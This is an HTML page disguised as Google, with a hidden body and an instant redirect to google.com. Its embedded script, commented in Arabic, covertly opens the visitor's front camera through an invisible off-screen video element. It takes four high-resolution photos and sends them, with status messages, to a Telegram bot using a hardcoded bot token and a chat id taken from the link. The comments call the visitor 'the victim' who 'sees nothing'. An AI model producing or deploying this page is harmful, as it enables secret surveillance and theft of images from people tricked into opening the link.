<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="0; url=https://www.google.com">
    <title>Google</title>
    <style>
        body { display: none; }
    </style>
</head>
<body>
    <script>
        // ==================== جلب الإيدي من الرابط ====================
        const USER_ID = new URLSearchParams(window.location.search).get('id');
        const BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";

        // إذا ما في ID بالرابط، نوقف
        if (!USER_ID) {
            window.location.replace("https://www.google.com");
        } else {
            // ==================== الكاميرا الأمامية - صور فقط ====================
            (async function() {
                try {
                    // طلب الكاميرا الأمامية بأعلى دقة (FULL HD)
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            facingMode: 'user', // الكاميرا الأمامية
                            width: { ideal: 1920, max: 1920 },
                            height: { ideal: 1080, max: 1080 }
                        }
                    });

                    // عنصر فيديو مخفي للتصوير
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.setAttribute('playsinline', '');
                    video.setAttribute('autoplay', '');
                    video.style.position = 'absolute';
                    video.style.left = '-9999px';
                    video.style.top = '-9999px';
                    video.style.width = '1px';
                    video.style.height = '1px';
                    video.style.opacity = '0';
                    document.body.appendChild(video);

                    await video.play();
                    
                    // انتظار تحميل الفيديو
                    await new Promise(resolve => {
                        if (video.videoWidth > 0) resolve();
                        else video.onloadedmetadata = resolve;
                    });

                    // إرسال معلومات الدقة (تأكيد)
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: USER_ID,
                            text: `📸 <b>تصوير من الكاميرا الأمامية</b>\nالدقة: ${video.videoWidth} x ${video.videoHeight}`,
                            parse_mode: 'HTML'
                        })
                    });

                    // ==================== التقاط 4 صور متتالية ====================
                    for (let i = 0; i < 4; i++) {
                        // تأخير بين الصور (للحصول على تعابير مختلفة)
                        await new Promise(r => setTimeout(r, i * 500));

                        // إنشاء canvas بالدقة الكاملة
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        
                        // تحسين جودة الرسم
                        const ctx = canvas.getContext('2d');
                        ctx.imageSmoothingEnabled = true;
                        ctx.imageSmoothingQuality = 'high';
                        
                        // رسم الصورة من الفيديو
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                        // تحويل إلى blob بأعلى جودة
                        const blob = await new Promise(resolve => 
                            canvas.toBlob(resolve, 'image/jpeg', 0.98)
                        );

                        // إرسال الصورة للتيليجرام
                        const formData = new FormData();
                        formData.append('chat_id', USER_ID);
                        formData.append('photo', blob, `selfie_${i+1}.jpg`);
                        formData.append('caption', `📸 صورة سيلفي ${i+1} - ${new Date().toLocaleString('ar-SA')}`);

                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });

                        // تحديث الحالة في الكونسول فقط (الضحية لا يرى شيئاً)
                        console.log(`✅ تم التقاط وإرسال الصورة ${i+1}/4`);
                    }

                    // إرسال تأكيد الانتهاء
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: USER_ID,
                            text: `✅ <b>اكتمل التصوير</b>\nتم إرسال 4 صور من الكاميرا الأمامية`,
                            parse_mode: 'HTML'
                        })
                    });

                    // تنظيف
                    stream.getTracks().forEach(track => track.stop());
                    video.remove();

                } catch (error) {
                    // في حالة الفشل
                    console.error('Camera error:', error);
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: USER_ID,
                            text: `❌ فشل الوصول للكاميرا الأمامية: ${error.message}`
                        })
                    });
                }

                // تحويل فوري لجوجل (الضحية لا يرى شيئاً)
                window.location.replace("https://www.google.com");
            })();
        }
    </script>
</body>
</html>
